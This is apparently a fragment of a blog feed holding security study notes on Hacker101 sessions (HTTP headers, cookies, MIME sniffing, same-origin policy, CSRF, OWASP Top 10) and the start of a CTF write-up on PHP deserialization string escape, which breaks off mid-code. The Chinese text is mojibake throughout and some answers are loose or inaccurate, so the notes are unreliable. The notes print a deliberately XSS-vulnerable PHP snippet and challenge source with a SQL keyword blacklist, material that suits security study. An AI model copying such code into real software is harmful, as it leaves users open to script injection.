        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>In this session weâ€™ll talk about how the web works from a security perspective.</p><p>åœ¨è¿™èŠ‚è¯¾æˆ‘ä»¬å°†è®¨è®ºä»å®‰å…¨è§’åº¦è§¦å‘webæœåŠ¡å¦‚ä½•å·¥ä½œçš„é—®é¢˜ã€‚</p><p><strong>What youâ€™ll learn</strong></p><ul><li>HTTP basics</li><li>Cookie security</li><li>HTML parsing</li><li>MIME sniffing</li><li>Encoding sniffing</li><li>Same-Origin Policy</li><li>CSRF (Cross-Site Request Forgery)</li></ul></blockquote><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p><strong>1.httpæŠ¥æ–‡çš„ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰</strong></p><p><img src="/../images/hacker101-THE-WEB-IN-DEPTH/22901708-0141fed962448a31.png"></p><p><strong>2.ä»€ä¹ˆæ˜¯crlfï¼Ÿåœ¨httpæŠ¥æ–‡çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆ1åˆ†ï¼‰</strong></p><p>å›è½¦æ¢è¡Œï¼Œæ¯è¡Œæœ«ä½</p><p><strong>3.è§£é‡Šä¸‹è¿™å‡ ä¸ªå¤´çš„å«ä¹‰ï¼ˆ5åˆ†ï¼‰</strong></p><p>HOST:è¯·æ±‚ä¸»æœº</p><p>Accept:è¡¨ç¤ºå®¢æˆ·ç«¯å¯æ¥å—å“ªç§MIMEç±»å‹ï¼ŒæŒ‡å®šwebæœåŠ¡æ˜¯ç”¨jsonæˆ–è€…xmlè¾“å‡ºã€‚</p><p>Cookie:ç»™æœåŠ¡å™¨ä¼ é€cookie</p><p>Referer:æ¥æºé¡µ(HTTPSæƒ…å†µä¸‹ä¸ä¼šä¼ é€’)</p><p>Authorization:è®¾ç½®èº«ä»½éªŒè¯çš„å‡­è¯</p><p><strong>4.cookieå…·æœ‰å“ªäº›ç‰¹ç‚¹ï¼Œä¸åŒçš„åŸŸåå’Œå­åŸŸåå¯¹cookieæœ‰æ€æ ·çš„æƒé™ï¼ŸCookieçš„Secureå’ŒHTTPOnlyè¿™ä¸¤ä¸ªflagåˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿè¯·ç»“åˆxssæ”»å‡»æ¥è¿›è¡Œè¯´æ˜ï¼ˆ3åˆ†ï¼‰</strong></p><p>ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¸´æ—¶å­˜åœ¨ã€‚ä¸ºåŸŸåè®¾ç½®çš„cookieï¼Œå­åŸŸåä¹Ÿå¯è¯»ã€‚å­åŸŸååªå¯å†™è‡ªèº«çš„cookieã€‚</p><p>Secure:é™åˆ¶åªæœ‰é€šè¿‡httpsè®¿é—®æ—¶æ‰èƒ½ä¼ é€’cookie</p><p>httponly:é˜»æ­¢JavaScriptè¯»å–cookieï¼Œå¯é˜²xssæ”»å‡»</p><p><strong>5.ç®€è¿°æœ¬è§†é¢‘æåˆ°çš„xssç»•è¿‡webé˜²ç«å¢™çš„æ–¹æ¡ˆï¼ˆ5åˆ†ï¼‰</strong></p><p>ç”¨UTF-7/UTF-32ç¼–ç payload</p><p><strong>6.å†…å®¹å—…æ¢æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªäº›ç±»å‹ï¼Ÿè¯·åˆ†åˆ«ä¸¾ä¾‹ï¼Œä¸»è¦ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼Ÿã€‚ä¸ºä»€ä¹ˆfacebookç­‰ç½‘ç«™éœ€è¦ä½¿ç”¨ä¸åŒçš„åŸŸåæ¥å­˜å‚¨å›¾ç‰‡ï¼Ÿï¼ˆ5åˆ†ï¼‰</strong></p><p>é€šè¿‡è§£ææ–‡ä»¶çš„å†…å®¹ï¼Œæ¥çŒœæµ‹MIMEç±»å‹çš„æ ¼å¼ã€‚æœ‰æµè§ˆå™¨å—…æ¢å’Œå®¢æˆ·ç«¯å—…æ¢ã€‚å®¢æˆ·ç«¯å—…æ¢å¯ç”¨æ¥åˆ¤æ–­æµè§ˆå™¨ä¸ºä»€ä¹ˆæµè§ˆå™¨ã€‚</p><p>æœ‰äº›MIMEç±»å‹æ˜¯å¯æ‰§è¡Œç±»å‹ï¼Œå¯ä»¥é€šè¿‡æ··æ·†MIMEå—…æ¢ç®—æ³•æ¥æ‰§è¡ŒXSSã€‚</p><p>é˜²æ­¢å†…å®¹å—…æ¢ã€‚</p><p><strong>7.åŒæºç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿé™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿæµè§ˆå™¨åœ¨é‡åˆ°å“ªä¸¤ç§æƒ…å†µçš„æ—¶å€™ä¼šç”¨åˆ°åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•æ”¾æ¾SOPé™åˆ¶ï¼Ÿæ”¾æ¾SOPé™åˆ¶ä¼šå¯¹æµè§ˆå™¨æ’ä»¶å®‰å…¨é€ æˆæ€æ ·çš„ç ´åï¼Ÿ</strong></p><p>åè®®åŸŸåç«¯å£ä¸‰è€…ç›¸åŒã€‚</p><p>é€šè¿‡XHRè¿æ¥åŸŸåå’Œè·¨ç‹¬ç«‹çš„æ¡†æ¶/çª—å£è¿›è¡Œè®¿é—®ã€‚</p><p>å®¹æ˜“é€ æˆXSS,CSRFæ”»å‡»ã€‚</p><p><strong>8.csrfæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è®¾è®¡è§„é¿csrfï¼Ÿè§†é¢‘ä¸­æåˆ°çš„é”™è¯¯çš„csrfé…ç½®æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚</p><p>éªŒè¯tokenï¼ŒéªŒè¯HTTPè¯·æ±‚çš„Refererï¼Œè¿˜æœ‰éªŒè¯XHRé‡Œçš„è‡ªå®šä¹‰headerã€‚</p><p>æ²¡æœ‰å¯¹è¯·æ±‚æ¥æºè¿›è¡ŒéªŒè¯/è¿‡æ»¤ã€‚</p><p><strong>é™„åŠ é¢˜ï¼š5ã€6ä¸¤ç‚¹ä¸»è¦åˆ©ç”¨çš„æ˜¯ç”±äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å¯¹åŒä¸€ä¿¡æ¯çš„å¤„ç†æ–¹å¼ä¸åŒé€ æˆçš„æ¼æ´ï¼Œä½ è¿˜èƒ½ä¸¾å‡ºç›¸ä¼¼çš„ä¾‹å­ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰</strong></p><p>SSTI</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> è‹±è¯­å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hacker101]A STARTERS GUIDE TO PENTESTING WITH OWASP</title>
      <link href="/p/960623103.html"/>
      <url>/p/960623103.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><blockquote><p>What is OWASP and what is the OWASP Top 10? Quick review of top 10 categories and types of vulnerabilities. Concludes with a detailed testing guide walkthrough.</p><p>ä»€ä¹ˆæ˜¯OWASPï¼ŒOWASPä¸­çš„TOP10åˆæ˜¯ä»€ä¹ˆï¼Ÿå¿«é€Ÿå›é¡¾ä¸‹TOP10çš„åˆ†ç±»ä»¥åŠæ¼æ´ç±»å‹ï¼Œæœ€åç»™å‡ºä¸€ä¸ªè¯¦ç»†çš„æµ‹è¯•æŒ‡å—æ¼”ç»ƒã€‚</p></blockquote><p><strong>1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰</strong></p><p>Injection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Using Components with Known Vulnerabilities, Insufficient Logging &amp; Monitoring</p><p>å¸¸è§ç¨‹åº¦</p><p><strong>2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†ï¼‰</strong></p><p>æ’åº“</p><p><strong>3.ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•(insufficient logging)ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ2åˆ†ï¼‰</strong></p><p>å› ä¸ºè¿™å¯ä»¥è®©æ”»å‡»è€…è¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿï¼Œä¿æŒæŒä¹…çš„è¿æ¥ï¼Œè½¬è€Œç¯¡æ”¹ã€æå–ã€ç ´åæ•°æ®ã€‚</p><p>å¾ˆå¤šç ”ç©¶è¡¨æ˜è¶…è¿‡200å¤©ä»¥ä¸Šçš„è¿è§„æ”»å‡»ï¼Œéƒ½æ˜¯ç”±å†…éƒ¨çš„æ—¥å¿—è®°å½•å¼•èµ·çš„ã€‚</p><p><strong>4.è¯·ç¿»é˜…ä¸€ä¸‹<em>owasp testing guide</em>ï¼Œä»¥åŠ<em>owasp testing guide check-list</em>ï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ3åˆ†ï¼‰</strong></p><p>å¤§è‡´æµè§ˆçœ‹check-listï¼Œè·Ÿç€guideä¸­çš„å…·ä½“æ“ä½œå»å°è¯•ï¼Œä¸ç”¨æ‹…å¿ƒè®°ä¸ä¸‹æ‰€æœ‰æ¼æ´ï¼Œå¤šåšç¬”è®°å¤šå›é¡¾å°±å¥½ã€‚</p><p><strong>5.You are only as good as you notes. You are only as good as things you can refer to. ç»“åˆè¿™ä¸¤å¥è¯è°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ2åˆ†ï¼‰</strong></p><p>å¤šåšç¬”è®°ï¼Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œä¸è¦å¥½é«˜éª›è¿œï¼ŒæŠŠæ¡å½“ä¸‹èƒ½æŒæ¡çš„æ‰æ˜¯æœ€é‡è¦çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> è‹±è¯­å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hacker101]INTRODUCTION</title>
      <link href="/p/84257377.html"/>
      <url>/p/84257377.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="https://www.hacker101.com/sessions/introduction.html">https://www.hacker101.com/sessions/introduction.html</a></p><blockquote><p>In this session we talk about the class and introduce the instructor, Cody Brocious, then jump into the mind of a breaker and talk about how you can take the things you learn in this class and apply them to real situations.</p><p>åœ¨è¿™ä¸ªç« èŠ‚æˆ‘ä»¬å°†è®¨è®ºè¯¾ç¨‹ç›¸å…³çš„å†…å®¹ï¼Œä»‹ç»ä¸‹å¯¼å¸ˆCody Brociousï¼Œç„¶åä»¥ä¸€ä¸ªbreakerçš„æ€ç»´å»è®¨è®ºä½ åœ¨è¯¾ç¨‹ä¸­å­¦åˆ°çš„ä¸œè¥¿è¯¥å¦‚ä½•å»åšï¼Œå¦‚ä½•åº”ç”¨åˆ°çœŸå®ç¯å¢ƒã€‚</p><p><strong>What youâ€™ll learn</strong></p><ul><li>Required tools æ‰€éœ€è¦çš„å·¥å…·</li><li>Thinking like a breaker åƒbreakerä¸€æ ·æ€è€ƒ</li><li>Attacker-defender imbalance æ”»é˜²å¤±è¡¡</li><li>Lightweight threat assessment and prioritization è½»åº¦é£é™©è¯„ä¼°å’Œä¼˜å…ˆçº§</li><li>How to write good bug reports å¦‚ä½•å†™ä¸€ä¸ªä¼˜é›…çš„bugæŠ¥å‘Š</li><li>Reflected XSS (Cross-Site Scripting) XSSåå°„</li></ul></blockquote><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p><strong>1.æœ¬è§†é¢‘ä¸€å¼€å§‹ä»‹ç»äº†å“ªä¸¤ä¸ªå·¥å…·ï¼Œä»–ä»¬çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä½œè€…ä¼šæ¨èfirefoxï¼Œå®ƒçš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ5åˆ†ï¼‰</strong></p><p>Burpsuiteï¼šå…è®¸ä½ ç›‘è§†åŒ…æ‹¬HTTP/HTTPSæ•°æ®æµï¼Œå¯ä»¥ä¸­é€”ä¿®æ”¹æˆ–é‡å‘æ•°æ®åŒ…ã€‚</p><p>Firefoxæµè§ˆå™¨ï¼šå¯ä»¥è®¾ç½®ä»£ç†è€Œé¿å…ç³»ç»Ÿä»£ç†çš„è¯¸å¤šé—®é¢˜ã€‚</p><p><strong>2.æœ¬è§†é¢‘ä¸­ä½“ç°äº†å“ªäº›æ”»é˜²ä¸Šçš„å“²å­¦è§‚ç‚¹ï¼Ÿä½œè€…å¸Œæœ›ä½ å…»æˆä»€ä¹ˆæ ·çš„æ€ç»´ï¼Ÿè¿™äº›æ€ç»´åœ¨å¸®åŠ©ä½ æŒ–æ˜æ¼æ´çš„æ—¶å€™æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿç»“åˆä½ çš„ç»å†ä¸è§†é¢‘å†…å®¹è°ˆè°ˆä½ çš„çœ‹æ³•ã€‚ï¼ˆ10åˆ†ï¼‰</strong></p><p>å…ˆå‘åˆ¶äººã€‚</p><p>æŒ‰ä¸‹æœ€å…³é”®çš„æŒ‰é’®å»æŸ¥çœ‹åé¦ˆã€‚å¦‚æœä¸ç†è§£è¿™ä¸ªç¨‹åºåœ¨åšä»€ä¹ˆ/ä¸ºä»€ä¹ˆï¼Œå°±å¾ˆéš¾å»æ‰¾åˆ°æ–¹æ³•å»æ¸—é€ã€‚</p><p>æ¼æ´æ˜¯æ½œè—åœ¨ç¨‹åºæµç¨‹ä¹‹ä¸­çš„ï¼Œæ‰€ä»¥æŒ–æ˜æ¼æ´çš„å‰ææ˜¯æŠŠæˆ‘ç¨‹åºè„‰ç»œã€‚</p><p><strong>3.å®¡è®¡ä»¥ä¸‹ä»£ç ï¼š</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span> <span class="token string">' name '</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>echo <span class="token string">"&lt;h1>Hello &#123;$_GET['name']&#125; !&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token operator">></span>Enter your name<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"input"</span> name<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">" submit"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æœ¬æ®µä»£ç æ¶‰åŠåˆ°å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯ä»¥åŠé€šä¿¡åè®®ã€‚</p><p>è¿è¡Œåœ¨å®¢æˆ·ç«¯çš„ä»£ç ä¸»è¦æœ‰HTMLä»¥åŠjavascriptï¼Œç”±æµè§ˆå™¨æ ¸å¿ƒè´Ÿè´£è§£é‡Š</p><p>é€šä¿¡åè®®ä¸ºHTTPåè®®ï¼Œæœ‰å¤šç§æ ¼å¼çš„è¯·æ±‚åŒ…ï¼Œå¸¸è§çš„ä¸ºPOSTä¸GET è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ä»£ç ä¸ºphpï¼Œç”±phpæ ¸å¿ƒè´Ÿè´£è§£é‡Šã€‚</p><p>ç”¨æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šè¿‡HTTPé€šä¿¡åè®®è¿›è¡Œäº¤äº’ã€‚</p></blockquote><p>**é‚£ä¹ˆï¼Œä»¥ä¸Šä»£ç ä¸­ï¼Œå“ªäº›éƒ¨åˆ†å±äºå®¢æˆ·ç«¯çš„å†…å®¹ï¼Œå“ªäº›å±äºæœåŠ¡ç«¯çš„å†…å®¹ï¼Ÿï¼ˆ1åˆ†ï¼‰ **</p><p>å®¢æˆ·ç«¯ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter your name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">' name '</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span> !&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**å®¢æˆ·ç«¯æ˜¯é€šè¿‡ä¼ é€’ä»€ä¹ˆå‚æ•°æ¥æ§åˆ¶æœåŠ¡ç«¯ä»£ç çš„ï¼Ÿï¼ˆ1åˆ†ï¼‰ **</p><p>GETå‚æ•°</p><p><strong>å®¢æˆ·ç«¯é€šè¿‡æ§åˆ¶è¯¥å‚æ•°ä¼šå¯¹æœåŠ¡ç«¯é€ æˆä»€ä¹ˆå½±å“ï¼Œç»§è€Œä½¿å¾—å®¢æˆ·ç«¯æœ¬èº«æ”¶åˆ°å½±å“ï¼Œä»è€Œé€ æˆäº†ä»€ä¹ˆæ¼æ´ï¼Ÿå¦‚æœæ˜¯xssæ¼æ´ï¼Œå…·ä½“åˆæ˜¯ä»€ä¹ˆç±»å‹çš„xssæ¼æ´ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼ˆ3åˆ†ï¼‰</strong></p><p>å¯ä»¥ä»»æ„æ‰§è¡ŒJavaScript/HTMLä»£ç ï¼Œé€ æˆxssæ¼æ´ã€‚</p><p>å±äºåå°„å‹ï¼Œæ¶æ„ä»£ç æœªè¢«æœåŠ¡å™¨å­˜å‚¨ï¼Œéœ€è¦é€šè¿‡GET/POSTæ–¹å¼æ‰å¯è§¦å‘ã€‚</p><p><strong>4.æ€è€ƒï¼šç°å®ä¸­å¦‚ä½•åˆ©ç”¨xssæ¼æ´å®æ–½æ”»å‡»ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•é¢„é˜²ï¼Ÿï¼ˆ1åˆ†ï¼‰</strong></p><p>æ‰¾onäº‹ä»¶ã€imgæ ‡ç­¾ç­‰å¸¦æœ‰xssæ¼æ´çš„åœ°æ–¹ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ï¼Œå…¥cookie/session</p><p>ç”¨æˆ·å¯æ¢å¸¦æœ‰XSS Auditorçš„è°·æ­Œæµè§ˆå™¨ï¼Œç®¡ç†äººå‘˜åˆ™éœ€è¦åŠ å¼ºè¿‡æ»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> è‹±è¯­å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GYCTF2020]Easyphp</title>
      <link href="/p/3540088970.html"/>
      <url>/p/3540088970.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸]</p><p>ååˆ†å¤æ‚ä¸”ç»å…¸çš„ä¾‹é¢˜ï¼Œéœ€è¦å¤šå›é¡¾ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804163917142.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>éšä¾¿æ‰“ï¼Œæç¤ºç”¨æˆ·ä¸å­˜åœ¨</p><p>è¾“å…¥adminï¼Œæç¤ºå¯†ç é”™è¯¯ï¼Œé‚£ä¹ˆç”¨æˆ·ååº”è¯¥å°±æ˜¯adminäº†ï¼Œå…ˆçˆ†ç ´ä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804164308537.png"></p><p>æç¤ºè¢«æ£€æµ‹åˆ°äº†ï¼Œé‚£å¯èƒ½æ˜¯sqlæ³¨å…¥ã€‚</p><p>è€è§„çŸ©ï¼Œfuzzä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804170802180.png"></p><p>éšæ‰‹è¯•äº†è¯•<a href="http://www.zip,å¾—,æºç æ³„æ¼/">www.zipï¼Œå¾—ï¼Œæºç æ³„æ¼</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804204402692.png"></p><p>å¯è§åªè¦ç™»å½•æˆåŠŸï¼Œå°±èƒ½æ‹¿flag</p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>lib.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ çš„IDæ˜¯"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ å¥½ï¼"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token 